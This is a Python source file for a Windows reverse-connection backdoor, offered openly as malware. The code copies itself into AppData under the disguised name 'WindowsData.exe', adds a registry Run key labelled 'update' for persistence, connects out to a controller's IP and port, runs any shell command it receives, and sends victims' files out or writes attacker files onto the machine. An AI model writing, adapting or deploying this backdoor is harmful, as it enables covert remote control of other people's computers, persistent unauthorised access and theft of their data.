#!/usr/bin/env python

import socket, subprocess, json, os, base64, shutil, sys

class Reverse_connection_backdoor:

    def __init__(self, ip, port):
        self.__run_on_startup()
        self.r_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.r_conn.connect((ip, port))


    def __run_on_startup(self):
        # get AppData directory
        default_dir_exec = os.environ["AppData"] + '\\' + "WindowsData.exe"
        if not os.path.exists(default_dir_exec):
            # copy this exe converted file to the appropriate location
            shutil.copyfile(sys.executable, default_dir_exec)
            # add the executable to the registry to be executable everytime on system startup
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +
                            default_dir_exec + '"', shell=True)


    def __command_exec(self, command_tobe_executed):
        if command_tobe_executed[0] == "exit":
            self.r_conn.close()
            exit()
        output = subprocess.check_output(command_tobe_executed, shell=True)
        return output

    def __change_dir(self, path):
        os.chdir(path)
        new_dir = "Changed directory to " + path
        return new_dir

    def __serialized_send(self, data):
        s_data = json.dumps(data)
        self.r_conn.sendall(s_data)

    def __read_file(self, path):
        with open(path, "rb") as file_toread_from:
            return base64.b64encode(file_toread_from.read())

    def __write_file(self, file_to_write, contents):
        with open(file_to_write, "wb") as new_file:
            new_file.write(base64.b64decode(contents))
        return "Success, Uploaded file "+file_to_write+" !!! "

    def __deserialized_receive(self, buffersize):
        streamed_data = self.r_conn.recv(buffersize)
        return json.loads(streamed_data)

    def start(self, bufferSize):
        while True:
            try:
                received_command = self.__deserialized_receive(bufferSize)
                if received_command[0] == "cd" and len(received_command) == 2:
                    result = self.__change_dir(received_command[1])
                elif received_command[0] == "download" and len(received_command) == 2:
                    result = self.__read_file(received_command[1])
                elif received_command[0] == "upload" and len(received_command) == 3:
                    result = self.__write_file(received_command[1], received_command[2])
                else:
                    print(received_command)
                    result = self.__command_exec(received_command)
            ## This is done on this scenario to avoid lose connection in any case
            except Exception:
                result = "Server side errror"

            self.__serialized_send(result)


